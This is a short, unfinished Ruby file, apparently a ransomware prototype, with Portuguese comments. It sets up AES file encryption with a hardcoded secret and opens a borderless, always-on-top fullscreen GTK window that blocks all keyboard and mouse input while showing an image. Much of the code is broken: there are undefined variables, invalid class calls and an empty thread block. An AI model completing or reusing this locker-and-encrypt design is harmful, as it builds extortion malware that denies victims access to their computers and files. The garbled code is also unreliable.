require 'gtk3'
require 'openssl'
require 'base64'
require 'fileutils'
require 'bcrypt'

def gerando_a_senha(senha)
BCrypt::Password.create(senha)[0,16]

end


KEY = senha
IV = "1234567891011121"

def criptografar_arquivos(caminho, senha)
  key = gerando_a_senha("chave_senha_secreta")
  iv = Open::Random.random_bytes(16)

  cipher = OpenSSL::Cipher(AES-128-CBC)
  cipher.encrypt
  cipher.key = key
  cipher.iv = iv
  




end





window = Gtk::Window.new
window.decorated = false        # sem bordas
window.fullscreen               # ocupa toda a tela
window.keep_above = true        # sempre no topo

# impede interação dentro da janela
window.signal_connect("key-press-event") { true }
window.signal_connect("button-press-event") { true }

# exibe imagem em tela cheia
pixbuf = GdkPixbuf::Pixbuf.new(file: "img.png")
image = Gtk::Image.new(pixbuf: pixbuf)
window.add(image)

# redimensiona imagem conforme o tamanho da tela
window.signal_connect("size-allocate") do |_, allocation|
  scaled = pixbuf.scale_simple(allocation.width, allocation.height, GdkPixbuf::InterpType::BILINEAR)
  image.set_from_pixbuf(scaled)
end

window.show_all
Gtk.main
















thread.new do














end





















